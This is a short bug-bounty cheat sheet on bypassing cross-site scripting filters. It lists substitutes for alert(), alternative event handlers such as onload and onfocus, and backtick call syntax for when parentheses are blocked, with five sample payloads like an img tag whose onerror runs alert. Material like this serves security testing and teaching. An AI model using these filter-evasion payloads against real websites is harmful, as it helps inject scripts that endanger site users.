# XSS Filter Bypass Techniques

## Introduction

For those new to Cross-Site Scripting (XSS) attacks, it is essential to first understand the fundamental concepts before exploring filter bypass techniques.

---

## Alternatives to `alert()`

Many web applications block the `alert()` function to mitigate XSS attacks. Below are alternative functions that can be used:

- **`confirm()`** instead of `alert()`
- **`prompt()`** instead of `alert()`
- **`console.log()`** instead of `alert()`
- **`eval()`** instead of `alert()`

---

## Alternatives to the `onerror` Event Handler

If the `onerror` event handler is blocked, the following alternatives can be used to trigger JavaScript execution:

- **`onload`**
- **`onfocus`**
- **`onmouseover`**
- **`onblur`**
- **`onclick`**
- **`onscroll`**

These event handlers can be embedded within HTML elements to execute scripts when the event is triggered.

---

## Handling Parentheses Filtering

If parentheses `()` are filtered, backticks `` ` ` `` can be used as an alternative. Examples:

```html
<script>alert`1`</script>
<img src=x onerror=alert`1`>
<img src=x onerror=prompt`1`>
javascript:prompt`1`
javascript:alert`1`
```

This method is effective against weak input sanitization mechanisms that only block standard function calls enclosed in parentheses.

---

## Additional Resources

For further learning and reference, the following resources provide comprehensive details on XSS filter evasion techniques:

1. **PortSwigger XSS Cheat Sheet** - [Visit PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
2. **OWASP XSS Filter Evasion Cheat Sheet** - [Visit OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

---

## Contact Information

For discussions and insights, you can connect with:

- **[@Fani Malik](https://twitter.com/fanimalikhack/)**

---
*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*
